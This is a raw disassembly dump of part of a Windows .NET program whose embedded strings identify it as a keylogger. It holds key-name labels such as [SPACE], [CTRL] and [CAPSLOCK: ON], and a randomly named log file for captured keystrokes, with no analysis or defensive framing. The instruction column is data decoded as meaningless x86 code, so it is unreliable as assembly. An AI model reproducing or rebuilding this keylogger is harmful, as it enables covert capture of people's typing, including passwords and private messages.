  40306c:	69 62 00 00 00 03 5b 	imul   $0x5b030000,0x0(%edx),%esp
  403073:	00 00                	add    %al,(%eax)
  403075:	03 5d 00             	add    0x0(%ebp),%ebx
  403078:	00 0b                	add    %cl,(%ebx)
  40307a:	53                   	push   %ebx
  40307b:	00 70 00             	add    %dh,0x0(%eax)
  40307e:	61                   	popa
  40307f:	00 63 00             	add    %ah,0x0(%ebx)
  403082:	65 00 00             	add    %al,%gs:(%eax)
  403085:	0d 52 00 65 00       	or     $0x650052,%eax
  40308a:	74 00                	je     0x40308c
  40308c:	75 00                	jne    0x40308e
  40308e:	72 00                	jb     0x403090
  403090:	6e                   	outsb  %ds:(%esi),(%dx)
  403091:	00 00                	add    %al,(%eax)
  403093:	0d 45 00 73 00       	or     $0x730045,%eax
  403098:	63 00                	arpl   %eax,(%eax)
  40309a:	61                   	popa
  40309b:	00 70 00             	add    %dh,0x0(%eax)
  40309e:	65 00 00             	add    %al,%gs:(%eax)
  4030a1:	17                   	pop    %ss
  4030a2:	4c                   	dec    %esp
  4030a3:	00 43 00             	add    %al,0x0(%ebx)
  4030a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4030a7:	00 6e 00             	add    %ch,0x0(%esi)
  4030aa:	74 00                	je     0x4030ac
  4030ac:	72 00                	jb     0x4030ae
  4030ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4030af:	00 6c 00 4b          	add    %ch,0x4b(%eax,%eax,1)
  4030b3:	00 65 00             	add    %ah,0x0(%ebp)
  4030b6:	79 00                	jns    0x4030b8
  4030b8:	00 17                	add    %dl,(%edi)
  4030ba:	52                   	push   %edx
  4030bb:	00 43 00             	add    %al,0x0(%ebx)
  4030be:	6f                   	outsl  %ds:(%esi),(%dx)
  4030bf:	00 6e 00             	add    %ch,0x0(%esi)
  4030c2:	74 00                	je     0x4030c4
  4030c4:	72 00                	jb     0x4030c6
  4030c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4030c7:	00 6c 00 4b          	add    %ch,0x4b(%eax,%eax,1)
  4030cb:	00 65 00             	add    %ah,0x0(%ebp)
  4030ce:	79 00                	jns    0x4030d0
  4030d0:	00 13                	add    %dl,(%ebx)
  4030d2:	52                   	push   %edx
  4030d3:	00 53 00             	add    %dl,0x0(%ebx)
  4030d6:	68 00 69 00 66       	push   $0x66006900
  4030db:	00 74 00 4b          	add    %dh,0x4b(%eax,%eax,1)
  4030df:	00 65 00             	add    %ah,0x0(%ebp)
  4030e2:	79 00                	jns    0x4030e4
  4030e4:	00 13                	add    %dl,(%ebx)
  4030e6:	4c                   	dec    %esp
  4030e7:	00 53 00             	add    %dl,0x0(%ebx)
  4030ea:	68 00 69 00 66       	push   $0x66006900
  4030ef:	00 74 00 4b          	add    %dh,0x4b(%eax,%eax,1)
  4030f3:	00 65 00             	add    %ah,0x0(%ebp)
  4030f6:	79 00                	jns    0x4030f8
  4030f8:	00 09                	add    %cl,(%ecx)
  4030fa:	42                   	inc    %edx
  4030fb:	00 61 00             	add    %ah,0x0(%ecx)
  4030fe:	63 00                	arpl   %eax,(%eax)
  403100:	6b 00 00             	imul   $0x0,(%eax),%eax
  403103:	09 4c 00 57          	or     %ecx,0x57(%eax,%eax,1)
  403107:	00 69 00             	add    %ch,0x0(%ecx)
  40310a:	6e                   	outsb  %ds:(%esi),(%dx)
  40310b:	00 00                	add    %al,(%eax)
  40310d:	07                   	pop    %es
  40310e:	54                   	push   %esp
  40310f:	00 61 00             	add    %ah,0x0(%ecx)
  403112:	62 00                	bound  %eax,(%eax)
  403114:	00 0f                	add    %cl,(%edi)
  403116:	43                   	inc    %ebx
  403117:	00 61 00             	add    %ah,0x0(%ecx)
  40311a:	70 00                	jo     0x40311c
  40311c:	69 00 74 00 61 00    	imul   $0x610074,(%eax),%eax
  403122:	6c                   	insb   (%dx),%es:(%edi)
  403123:	00 00                	add    %al,(%eax)
  403125:	0f 5b 00             	cvtdq2ps (%eax),%xmm0
  403128:	53                   	push   %ebx
  403129:	00 50 00             	add    %dl,0x0(%eax)
  40312c:	41                   	inc    %ecx
  40312d:	00 43 00             	add    %al,0x0(%ebx)
  403130:	45                   	inc    %ebp
  403131:	00 5d 00             	add    %bl,0x0(%ebp)
  403134:	00 0f                	add    %cl,(%edi)
  403136:	5b                   	pop    %ebx
  403137:	00 45 00             	add    %al,0x0(%ebp)
  40313a:	4e                   	dec    %esi
  40313b:	00 54 00 45          	add    %dl,0x45(%eax,%eax,1)
  40313f:	00 52 00             	add    %dl,0x0(%edx)
  403142:	5d                   	pop    %ebp
  403143:	00 00                	add    %al,(%eax)
  403145:	0b 5b 00             	or     0x0(%ebx),%ebx
  403148:	45                   	inc    %ebp
  403149:	00 53 00             	add    %dl,0x0(%ebx)
  40314c:	43                   	inc    %ebx
  40314d:	00 5d 00             	add    %bl,0x0(%ebp)
  403150:	00 0d 5b 00 43 00    	add    %cl,0x43005b
  403156:	54                   	push   %esp
  403157:	00 52 00             	add    %dl,0x0(%edx)
  40315a:	4c                   	dec    %esp
  40315b:	00 5d 00             	add    %bl,0x0(%ebp)
  40315e:	00 0f                	add    %cl,(%edi)
  403160:	5b                   	pop    %ebx
  403161:	00 53 00             	add    %dl,0x0(%ebx)
  403164:	68 00 69 00 66       	push   $0x66006900
  403169:	00 74 00 5d          	add    %dh,0x5d(%eax,%eax,1)
  40316d:	00 00                	add    %al,(%eax)
  40316f:	0d 5b 00 42 00       	or     $0x42005b,%eax
  403174:	61                   	popa
  403175:	00 63 00             	add    %ah,0x0(%ebx)
  403178:	6b 00 5d             	imul   $0x5d,(%eax),%eax
  40317b:	00 00                	add    %al,(%eax)
  40317d:	0b 5b 00             	or     0x0(%ebx),%ebx
  403180:	57                   	push   %edi
  403181:	00 49 00             	add    %cl,0x0(%ecx)
  403184:	4e                   	dec    %esi
  403185:	00 5d 00             	add    %bl,0x0(%ebp)
  403188:	00 0b                	add    %cl,(%ebx)
  40318a:	5b                   	pop    %ebx
  40318b:	00 54 00 61          	add    %dl,0x61(%eax,%eax,1)
  40318f:	00 62 00             	add    %ah,0x0(%edx)
  403192:	5d                   	pop    %ebp
  403193:	00 00                	add    %al,(%eax)
  403195:	1f                   	pop    %ds
  403196:	5b                   	pop    %ebx
  403197:	00 43 00             	add    %al,0x0(%ebx)
  40319a:	41                   	inc    %ecx
  40319b:	00 50 00             	add    %dl,0x0(%eax)
  40319e:	53                   	push   %ebx
  40319f:	00 4c 00 4f          	add    %cl,0x4f(%eax,%eax,1)
  4031a3:	00 43 00             	add    %al,0x0(%ebx)
  4031a6:	4b                   	dec    %ebx
  4031a7:	00 3a                	add    %bh,(%edx)
  4031a9:	00 20                	add    %ah,(%eax)
  4031ab:	00 4f 00             	add    %cl,0x0(%edi)
  4031ae:	46                   	inc    %esi
  4031af:	00 46 00             	add    %al,0x0(%esi)
  4031b2:	5d                   	pop    %ebp
  4031b3:	00 00                	add    %al,(%eax)
  4031b5:	1d 5b 00 43 00       	sbb    $0x43005b,%eax
  4031ba:	41                   	inc    %ecx
  4031bb:	00 50 00             	add    %dl,0x0(%eax)
  4031be:	53                   	push   %ebx
  4031bf:	00 4c 00 4f          	add    %cl,0x4f(%eax,%eax,1)
  4031c3:	00 43 00             	add    %al,0x0(%ebx)
  4031c6:	4b                   	dec    %ebx
  4031c7:	00 3a                	add    %bh,(%edx)
  4031c9:	00 20                	add    %ah,(%eax)
  4031cb:	00 4f 00             	add    %cl,0x0(%edi)
  4031ce:	4e                   	dec    %esi
  4031cf:	00 5d 00             	add    %bl,0x0(%ebp)
  4031d2:	00 0b                	add    %cl,(%ebx)
  4031d4:	23 00                	and    (%eax),%eax
  4031d6:	23 00                	and    (%eax),%eax
  4031d8:	23 00                	and    (%eax),%eax
  4031da:	20 00                	and    %al,(%eax)
  4031dc:	20 00                	and    %al,(%eax)
  4031de:	00 09                	add    %cl,(%ecx)
  4031e0:	20 00                	and    %al,(%eax)
  4031e2:	23 00                	and    (%eax),%eax
  4031e4:	23 00                	and    (%eax),%eax
  4031e6:	23 00                	and    (%eax),%eax
  4031e8:	00 01                	add    %al,(%ecx)
  4031ea:	00 07                	add    %al,(%edi)
  4031ec:	3f                   	aas
  4031ed:	00 3f                	add    %bh,(%edi)
  4031ef:	00 3f                	add    %bh,(%edi)
  4031f1:	00 00                	add    %al,(%eax)
  4031f3:	29 5c 00 53          	sub    %ebx,0x53(%eax,%eax,1)
  4031f7:	00 61 00             	add    %ah,0x0(%ecx)
  4031fa:	38 00                	cmp    %al,(%eax)
  4031fc:	58                   	pop    %eax
  4031fd:	00 4f 00             	add    %cl,0x0(%edi)
  403200:	66 00 48 00          	data16 add %cl,0x0(%eax)
  403204:	31 00                	xor    %eax,(%eax)
  403206:	42                   	inc    %edx
  403207:	00 75 00             	add    %dh,0x0(%ebp)
  40320a:	64 00 58 00          	add    %bl,%fs:0x0(%eax)
  40320e:	4c                   	dec    %esp
  40320f:	00 6f 00             	add    %ch,0x0(%edi)
  403212:	67 00 2e 00 74       	add    %ch,0x7400
  403217:	00 78 00             	add    %bh,0x0(%eax)
  40321a:	74 00                	je     0x40321c
  40321c:	00 3d 4b 00 65 00    	add    %bh,0x65004b
  403222:	79 00                	jns    0x403224
  403224:	6c                   	insb   (%dx),%es:(%edi)
  403225:	00 6f 00             	add    %ch,0x0(%edi)
  403228:	67 00 67 00          	add    %ah,0x0(%bx)
  40322c:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  403230:	2e 00 50 00          	add    %dl,%cs:0x0(%eax)
  403234:	72 00                	jb     0x403236
  403236:	6f                   	outsl  %ds:(%esi),(%dx)
  403237:	00 70 00             	add    %dh,0x0(%eax)
  40323a:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40323e:	74 00                	je     0x403240
  403240:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  403246:	2e 00 52 00          	add    %dl,%cs:0x0(%edx)
  40324a:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40324e:	6f                   	outsl  %ds:(%esi),(%dx)
  40324f:	00 75 00             	add    %dh,0x0(%ebp)
  403252:	72 00                	jb     0x403254
  403254:	63 00                	arpl   %eax,(%eax)
  403256:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40325a:	00 00                	add    %al,(%eax)
  40325c:	00 04 00             	add    %al,(%eax,%eax,1)
  40325f:	01 00                	add    %eax,(%eax)
  403261:	00 08                	add    %cl,(%eax)
  403263:	01 00                	add    %eax,(%eax)
  403265:	02 00                	add    (%eax),%al
  403267:	00 00                	add    %al,(%eax)
  403269:	00 00                	add    %al,(%eax)
  40326b:	08 01                	or     %al,(%ecx)
  40326d:	00 08                	add    %cl,(%eax)
  40326f:	00 00                	add    %al,(%eax)
  403271:	00 00                	add    %al,(%eax)
  403273:	00 1e                	add    %bl,(%esi)
  403275:	01 00                	add    %eax,(%eax)
  403277:	01 00                	add    %eax,(%eax)
  403279:	54                   	push   %esp
  40327a:	02 16                	add    (%esi),%dl
  40327c:	57                   	push   %edi
  40327d:	72 61                	jb     0x4032e0
  40327f:	70 4e                	jo     0x4032cf
  403281:	6f                   	outsl  %ds:(%esi),(%dx)
  403282:	6e                   	outsb  %ds:(%esi),(%dx)
  403283:	45                   	inc    %ebp
  403284:	78 63                	js     0x4032e9
  403286:	65 70 74             	gs jo  0x4032fd
  403289:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  403290:	77 73                	ja     0x403305
  403292:	01 08                	add    %ecx,(%eax)
  403294:	01 00                	add    %eax,(%eax)
  403296:	02 00                	add    (%eax),%al
  403298:	00 00                	add    %al,(%eax)
  40329a:	00 00                	add    %al,(%eax)
  40329c:	0e                   	push   %cs
  40329d:	01 00                	add    %eax,(%eax)
  40329f:	09 4b 65             	or     %ecx,0x65(%ebx)
  4032a2:	79 6c                	jns    0x403310
  4032a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4032a5:	67 67 65 72 00       	addr16 addr16 gs jb 0x4032aa
  4032aa:	00 05 01 00 00 00    	add    %al,0x1
  4032b0:	00 05 01 00 00 00    	add    %al,0x1
  4032b6:	00 05 01 00 00 00    	add    %al,0x1
  4032bc:	00 0e                	add    %cl,(%esi)
  4032be:	01 00                	add    %eax,(%eax)
  4032c0:	09 4b 65             	or     %ecx,0x65(%ebx)
  4032c3:	79 6c                	jns    0x403331
  4032c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4032c6:	67 67 65 72 00       	addr16 addr16 gs jb 0x4032cb
  4032cb:	00 17                	add    %dl,(%edi)
  4032cd:	01 00                	add    %eax,(%eax)
  4032cf:	12 43 6f             	adc    0x6f(%ebx),%al
  4032d2:	70 79                	jo     0x40334d
  4032d4:	72 69                	jb     0x40333f
  4032d6:	67 68 74 20 c2 a9    	addr16 push $0xa9c22074
  4032dc:	20 20                	and    %ah,(%eax)
  4032de:	32 30                	xor    (%eax),%dh
  4032e0:	32 31                	xor    (%ecx),%dh
  4032e2:	00 00                	add    %al,(%eax)
  4032e4:	05 01 00 00 00       	add    $0x1,%eax
  4032e9:	00 29                	add    %ch,(%ecx)
  4032eb:	01 00                	add    %eax,(%eax)
  4032ed:	24 35                	and    $0x35,%al
  4032ef:	64 30 31             	xor    %dh,%fs:(%ecx)
  4032f2:	61                   	popa
  4032f3:	33 32                	xor    (%edx),%esi
  4032f5:	36 2d 30 33 35 37    	ss sub $0x37353330,%eax
  4032fb:	2d 34 63 33 66       	sub    $0x66336334,%eax
  403300:	2d 61 31 39 36       	sub    $0x36393161,%eax
  403305:	2d 33 62 38 62       	sub    $0x62386233,%eax
  40330a:	38 36                	cmp    %dh,(%esi)
  40330c:	36 63 39             	arpl   %edi,%ss:(%ecx)
  40330f:	36 31 33             	xor    %esi,%ss:(%ebx)
  403312:	00 00                	add    %al,(%eax)
  403314:	0c 01                	or     $0x1,%al
  403316:	00 07                	add    %al,(%edi)
  403318:	31 2e                	xor    %ebp,(%esi)
  40331a:	30 2e                	xor    %ch,(%esi)
  40331c:	37                   	aaa
  40331d:	2e 30 00             	xor    %al,%cs:(%eax)
  403320:	00 47 01             	add    %al,0x1(%edi)
  403323:	00 1a                	add    %bl,(%edx)
  403325:	2e 4e                	cs dec %esi
  403327:	45                   	inc    %ebp
  403328:	54                   	push   %esp
  403329:	46                   	inc    %esi
  40332a:	72 61                	jb     0x40338d
  40332c:	6d                   	insl   (%dx),%es:(%edi)
  40332d:	65 77 6f             	gs ja  0x40339f
  403330:	72 6b                	jb     0x40339d
  403332:	2c 56                	sub    $0x56,%al
  403334:	65 72 73             	gs jb  0x4033aa
  403337:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40333e:	30 01                	xor    %al,(%ecx)
  403340:	00 54 0e 14          	add    %dl,0x14(%esi,%ecx,1)
  403344:	46                   	inc    %esi
  403345:	72 61                	jb     0x4033a8
  403347:	6d                   	insl   (%dx),%es:(%edi)
  403348:	65 77 6f             	gs ja  0x4033ba
  40334b:	72 6b                	jb     0x4033b8
  40334d:	44                   	inc    %esp
  40334e:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  403355:	61                   	popa
  403356:	6d                   	insl   (%dx),%es:(%edi)
  403357:	65 10 2e             	adc    %ch,%gs:(%esi)
  40335a:	4e                   	dec    %esi
  40335b:	45                   	inc    %ebp
  40335c:	54                   	push   %esp
  40335d:	20 46 72             	and    %al,0x72(%esi)
  403360:	61                   	popa
  403361:	6d                   	insl   (%dx),%es:(%edi)
  403362:	65 77 6f             	gs ja  0x4033d4
  403365:	72 6b                	jb     0x4033d2
  403367:	20 34 05 01 00 00 00 	and    %dh,0x1(,%eax,1)
  40336e:	00 08                	add    %cl,(%eax)
  403370:	01 00                	add    %eax,(%eax)
  403372:	02 00                	add    (%eax),%al
  403374:	00 00                	add    %al,(%eax)
  403376:	00 00                	add    %al,(%eax)
  403378:	40                   	inc    %eax
  403379:	01 00                	add    %eax,(%eax)
  40337b:	33 53 79             	xor    0x79(%ebx),%edx
  40337e:	73 74                	jae    0x4033f4
  403380:	65 6d                	gs insl (%dx),%es:(%edi)
  403382:	2e 52                	cs push %edx
  403384:	65 73 6f             	gs jae 0x4033f6
  403387:	75 72                	jne    0x4033fb
  403389:	63 65 73             	arpl   %esp,0x73(%ebp)
  40338c:	2e 54                	cs push %esp
  40338e:	6f                   	outsl  %ds:(%esi),(%dx)
  40338f:	6f                   	outsl  %ds:(%esi),(%dx)
  403390:	6c                   	insb   (%dx),%es:(%edi)
  403391:	73 2e                	jae    0x4033c1
  403393:	53                   	push   %ebx
  403394:	74 72                	je     0x403408
  403396:	6f                   	outsl  %ds:(%esi),(%dx)
  403397:	6e                   	outsb  %ds:(%esi),(%dx)
  403398:	67 6c                	insb   (%dx),%es:(%di)
  40339a:	79 54                	jns    0x4033f0
  40339c:	79 70                	jns    0x40340e
  40339e:	65 64 52             	gs fs push %edx
  4033a1:	65 73 6f             	gs jae 0x403413
  4033a4:	75 72                	jne    0x403418
  4033a6:	63 65 42             	arpl   %esp,0x42(%ebp)
  4033a9:	75 69                	jne    0x403414
  4033ab:	6c                   	insb   (%dx),%es:(%edi)
  4033ac:	64 65 72 07          	fs gs jb 0x4033b7
  4033b0:	34 2e                	xor    $0x2e,%al
  4033b2:	30 2e                	xor    %ch,(%esi)
  4033b4:	30 2e                	xor    %ch,(%esi)
  4033b6:	30 00                	xor    %al,(%eax)
  4033b8:	00 04 01             	add    %al,(%ecx,%eax,1)
  4033bb:	00 00                	add    %al,(%eax)
  4033bd:	00 04 01             	add    %al,(%ecx,%eax,1)
  4033c0:	00 00                	add    %al,(%eax)
  4033c2:	00 04 01             	add    %al,(%ecx,%eax,1)
  4033c5:	00 00                	add    %al,(%eax)
  4033c7:	00 59 01             	add    %bl,0x1(%ecx)
  4033ca:	00 4b 4d             	add    %cl,0x4d(%ebx)
  4033cd:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4033d4:	74 2e                	je     0x403404
  4033d6:	56                   	push   %esi
  4033d7:	69 73 75 61 6c 53 74 	imul   $0x74536c61,0x75(%ebx),%esi
  4033de:	75 64                	jne    0x403444
  4033e0:	69 6f 2e 45 64 69 74 	imul   $0x74696445,0x2e(%edi),%ebp
  4033e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4033e8:	72 73                	jb     0x40345d
  4033ea:	2e 53                	cs push %ebx
  4033ec:	65 74 74             	gs je  0x403463
  4033ef:	69 6e 67 73 44 65 73 	imul   $0x73654473,0x67(%esi),%ebp
  4033f6:	69 67 6e 65 72 2e 53 	imul   $0x532e7265,0x6e(%edi),%esp
  4033fd:	65 74 74             	gs je  0x403474
  403400:	69 6e 67 73 53 69 6e 	imul   $0x6e695373,0x67(%esi),%ebp
  403407:	67 6c                	insb   (%dx),%es:(%di)
  403409:	65 46                	gs inc %esi
  40340b:	69 6c 65 47 65 6e 65 	imul   $0x72656e65,0x47(%ebp,%eiz,2),%ebp
  403412:	72 
  403413:	61                   	popa
  403414:	74 6f                	je     0x403485
  403416:	72 08                	jb     0x403420
  403418:	31 31                	xor    %esi,(%ecx)
  40341a:	2e 30 2e             	xor    %ch,%cs:(%esi)
  40341d:	30 2e                	xor    %ch,(%esi)
  40341f:	30 00                	xor    %al,(%eax)
  403421:	00 04 01             	add    %al,(%ecx,%eax,1)
  403424:	00 00                	add    %al,(%eax)
  403426:	00 02                	add    %al,(%edx)
  403428:	06                   	push   %es
  403429:	0e                   	push   %cs
  40342a:	02 06                	add    (%esi),%al
  40342c:	08 03                	or     %al,(%ebx)
  40342e:	06                   	push   %es
  40342f:	12 18                	adc    (%eax),%bl
  403431:	02 06                	add    (%esi),%al
  403433:	18 03                	sbb    %al,(%ebx)
  403435:	06                   	push   %es
  403436:	12 35 03 06 12 39    	adc    0x39120603,%dh
  40343c:	03 06                	add    (%esi),%eax
  40343e:	12 10                	adc    (%eax),%dl
  403440:	01 02                	add    %eax,(%edx)
  403442:	01 15 03 00 00 01    	add    %edx,0x1000003
  403448:	05 00 01 18 12       	add    $0x12180100,%eax
  40344d:	18 06                	sbb    %al,(%esi)
  40344f:	00 03                	add    %al,(%ebx)
  403451:	18 08                	sbb    %cl,(%eax)
  403453:	18 18                	sbb    %bl,(%eax)
  403455:	04 00                	add    $0x0,%al
  403457:	01 0e                	add    %ecx,(%esi)
  403459:	09 03                	or     %eax,(%ebx)
  40345b:	00 00                	add    %al,(%eax)
  40345d:	0e                   	push   %cs
  40345e:	08 00                	or     %al,(%eax)
  403460:	04 18                	add    $0x18,%al
  403462:	08 12                	or     %dl,(%edx)
  403464:	18 18                	sbb    %bl,(%eax)
  403466:	09 04 00             	or     %eax,(%eax,%eax,1)
  403469:	01 02                	add    %eax,(%edx)
  40346b:	18 07                	sbb    %al,(%edi)
  40346d:	00 04 18             	add    %al,(%eax,%ebx,1)
  403470:	18 08                	sbb    %cl,(%eax)
  403472:	18 18                	sbb    %bl,(%eax)
  403474:	04 00                	add    $0x0,%al
  403476:	01 18                	add    %ebx,(%eax)
  403478:	0e                   	push   %cs
  403479:	03 00                	add    (%eax),%eax
  40347b:	00 18                	add    %bl,(%eax)
  40347d:	06                   	push   %es
  40347e:	00 02                	add    %al,(%edx)
  403480:	09 18                	or     %ebx,(%eax)
  403482:	10 09                	adc    %cl,(%ecx)
  403484:	04 00                	add    $0x0,%al
  403486:	01 06                	add    %eax,(%esi)
  403488:	08 05 00 01 02 1d    	or     %al,0x1d020100
  40348e:	05 04 00 01 18       	add    $0x18010004,%eax
  403493:	09 0c 00             	or     %ecx,(%eax,%eax,1)
  403496:	07                   	pop    %es
  403497:	08 09                	or     %cl,(%ecx)
  403499:	09 1d 05 12 29 08    	or     %ebx,0x8291205
  40349f:	09 18                	or     %ebx,(%eax)
  4034a1:	05 00 02 09 09       	add    $0x9090200,%eax
  4034a6:	09 03                	or     %eax,(%ebx)
  4034a8:	20 00                	and    %al,(%eax)
  4034aa:	01 04 00             	add    %eax,(%eax,%eax,1)
  4034ad:	00 12                	add    %dl,(%edx)
  4034af:	35 04 00 00 12       	xor    $0x12000004,%eax
  4034b4:	39 05 00 01 01 12    	cmp    %eax,0x12010100
  4034ba:	39 04 00             	cmp    %eax,(%eax,%eax,1)
  4034bd:	00 12                	add    %dl,(%edx)
  4034bf:	10 04 00             	adc    %al,(%eax,%eax,1)
  4034c2:	01 09                	add    %ecx,(%ecx)
  4034c4:	0e                   	push   %cs
  4034c5:	05 20 02 01 1c       	add    $0x1c010220,%eax
  4034ca:	18 06                	sbb    %al,(%esi)
  4034cc:	20 03                	and    %al,(%ebx)
  4034ce:	18 08                	sbb    %cl,(%eax)
  4034d0:	18 18                	sbb    %bl,(%eax)
  4034d2:	0a 20                	or     (%eax),%ah
  4034d4:	05 12 55 08 18       	add    $0x18085512,%eax
  4034d9:	18 12                	sbb    %dl,(%edx)
  4034db:	51                   	push   %ecx
  4034dc:	1c 05                	sbb    $0x5,%al
  4034de:	20 01                	and    %al,(%ecx)
  4034e0:	18 12                	sbb    %dl,(%edx)
  4034e2:	55                   	push   %ebp
  4034e3:	04 00                	add    $0x0,%al
  4034e5:	00 12                	add    %dl,(%edx)
  4034e7:	0d 03 20 00 0e       	or     $0xe002003,%eax
  4034ec:	04 00                	add    $0x0,%al
  4034ee:	01 18                	add    %ebx,(%eax)
  4034f0:	08 05 00 02 02 18    	or     %al,0x18020200
  4034f6:	18 04 00             	sbb    %al,(%eax,%eax,1)
  4034f9:	01 08                	add    %ecx,(%eax)
  4034fb:	18 06                	sbb    %al,(%esi)
  4034fd:	00 03                	add    %al,(%ebx)
  4034ff:	0e                   	push   %cs
  403500:	0e                   	push   %cs
  403501:	0e                   	push   %cs
  403502:	0e                   	push   %cs
  403503:	05 00 02 02 0e       	add    $0xe020200,%eax
  403508:	0e                   	push   %cs
  403509:	05 20 02 01 0e       	add    $0xe010220,%eax
  40350e:	02 04 20             	add    (%eax,%eiz,1),%al
  403511:	01 01                	add    %eax,(%ecx)
  403513:	0e                   	push   %cs
  403514:	05 00 01 12 0d       	add    $0xd120100,%eax
  403519:	08 04 00             	or     %al,(%eax,%eax,1)
  40351c:	01 02                	add    %eax,(%edx)
  40351e:	0e                   	push   %cs
  40351f:	06                   	push   %es
  403520:	00 01                	add    %al,(%ecx)
  403522:	0e                   	push   %cs
  403523:	11 80 a9 05 00 02    	adc    %eax,0x20005a9(%eax)
  403529:	0e                   	push   %cs
  40352a:	0e                   	push   %cs
  40352b:	0e                   	push   %cs
  40352c:	07                   	pop    %es
  40352d:	00 01                	add    %al,(%ecx)
  40352f:	12 3d 11 80 ad 04    	adc    0x4ad8011,%bh
  403535:	20 00                	and    %al,(%eax)
  403537:	12 41 06             	adc    0x6(%ecx),%al
  40353a:	20 02                	and    %al,(%edx)
  40353c:	01 0e                	add    %ecx,(%esi)
  40353e:	12 41 06             	adc    0x6(%ecx),%al
  403541:	00 01                	add    %al,(%ecx)
  403543:	12 49 12             	adc    0x12(%ecx),%cl
  403546:	49                   	dec    %ecx
  403547:	04 20                	add    $0x20,%al
  403549:	01 03                	add    %eax,(%ebx)
  40354b:	08 03                	or     %al,(%ebx)
  40354d:	20 00                	and    %al,(%eax)
  40354f:	08 06                	or     %al,(%esi)
  403551:	20 01                	and    %al,(%ecx)
  403553:	01 11                	add    %edx,(%ecx)
  403555:	80 b1 04 20 01 01 08 	xorb   $0x8,0x1012004(%ecx)
  40355c:	06                   	push   %es
  40355d:	20 01                	and    %al,(%ecx)
  40355f:	01 11                	add    %edx,(%ecx)
  403561:	80 b5 04 20 01 01 02 	xorb   $0x2,0x1012004(%ebp)
  403568:	05 20 02 01 0e       	add    $0xe010220,%eax
  40356d:	0e                   	push   %cs
  40356e:	04 08                	add    $0x8,%al
  403570:	00 12                	add    %dl,(%edx)
  403572:	35 04 08 00 12       	xor    $0x12000804,%eax
  403577:	39 04 08             	cmp    %eax,(%eax,%ecx,1)
  40357a:	00 12                	add    %dl,(%edx)
  40357c:	10 05 07 02 12 0d    	adc    %al,0xd120207
  403582:	18 0c 07             	sbb    %cl,(%edi,%eax,1)
  403585:	08 08                	or     %cl,(%eax)
  403587:	02 02                	add    (%edx),%al
  403589:	0e                   	push   %cs
  40358a:	11 19                	adc    %ebx,(%ecx)
  40358c:	0e                   	push   %cs
  40358d:	09 12                	or     %edx,(%edx)
  40358f:	1d 0c 07 07 12       	sbb    $0x1207070c,%eax
  403594:	29 1d 05 0e 09 09    	sub    %ebx,0x9090e05
  40359a:	18 11                	sbb    %dl,(%ecx)
  40359c:	19 07                	sbb    %eax,(%edi)
  40359e:	07                   	pop    %es
  40359f:	04 09                	add    $0x9,%al
  4035a1:	12 0d 0e 0e 04 07    	adc    0x7040e0e,%cl
  4035a7:	02 09                	add    (%ecx),%cl
  4035a9:	08 08                	or     %cl,(%eax)
  4035ab:	b7 7a                	mov    $0x7a,%bh
  4035ad:	5c                   	pop    %esp
  4035ae:	56                   	push   %esi
  4035af:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  4035b2:	89 00                	mov    %eax,(%eax)
  4035b4:	65 c7                	gs (bad)
  4035b6:	9e                   	sahf
  4035b7:	b0 0d                	mov    $0xd,%al
  4035b9:	f9                   	stc
  4035ba:	d4 4c                	aam    $0x4c
  4035bc:	ad                   	lods   %ds:(%esi),%eax
  4035bd:	c8 93 83 07          	enter  $0x8393,$0x7
  4035c1:	52                   	push   %edx
  4035c2:	28 ff                	sub    %bh,%bh
  4035c4:	00 00                	add    %al,(%eax)
  4035c6:	00 00                	add    %al,(%eax)
  4035c8:	02 00                	add    (%eax),%al
  4035ca:	00 00                	add    %al,(%eax)
  4035cc:	57                   	push   %edi
  4035cd:	3d a2 15 09 03       	cmp    $0x30915a2,%eax
  4035d2:	00 00                	add    %al,(%eax)
  4035d4:	00 fa                	add    %bh,%dl
  4035d6:	01 33                	add    %esi,(%ebx)
  4035d8:	00 16                	add    %dl,(%esi)
  4035da:	00 00                	add    %al,(%eax)
  4035dc:	01 00                	add    %eax,(%eax)
  4035de:	00 00                	add    %al,(%eax)
  4035e0:	2d 00 00 00 06       	sub    $0x6000000,%eax
  4035e5:	00 00                	add    %al,(%eax)
  4035e7:	00 0a                	add    %cl,(%edx)
  4035e9:	00 00                	add    %al,(%eax)
  4035eb:	00 1d 00 00 00 2c    	add    %bl,0x2c000000
  4035f1:	00 00                	add    %al,(%eax)
  4035f3:	00 31                	add    %dh,(%ecx)
  4035f5:	00 00                	add    %al,(%eax)
  4035f7:	00 01                	add    %al,(%ecx)
  4035f9:	00 00                	add    %al,(%eax)
  4035fb:	00 16                	add    %dl,(%esi)
  4035fd:	00 00                	add    %al,(%eax)
  4035ff:	00 03                	add    %al,(%ebx)
  403601:	00 00                	add    %al,(%eax)
  403603:	00 05 00 00 00 02    	add    %al,0x2000000
  403609:	00 00                	add    %al,(%eax)
  40360b:	00 03                	add    %al,(%ebx)
  40360d:	00 00                	add    %al,(%eax)
  40360f:	00 04 00             	add    %al,(%eax,%eax,1)
  403612:	00 00                	add    %al,(%eax)
  403614:	02 00                	add    (%eax),%al
  403616:	00 00                	add    %al,(%eax)
  403618:	0b 00                	or     (%eax),%eax
  40361a:	00 00                	add    %al,(%eax)
  40361c:	01 00                	add    %eax,(%eax)
  40361e:	00 00                	add    %al,(%eax)
  403620:	03 00                	add    (%eax),%eax
  403622:	00 00                	add    %al,(%eax)
  403624:	01 00                	add    %eax,(%eax)
  403626:	00 00                	add    %al,(%eax)
  403628:	01 00                	add    %eax,(%eax)
  40362a:	00 00                	add    %al,(%eax)
  40362c:	00 00                	add    %al,(%eax)
  40362e:	3c 03                	cmp    $0x3,%al
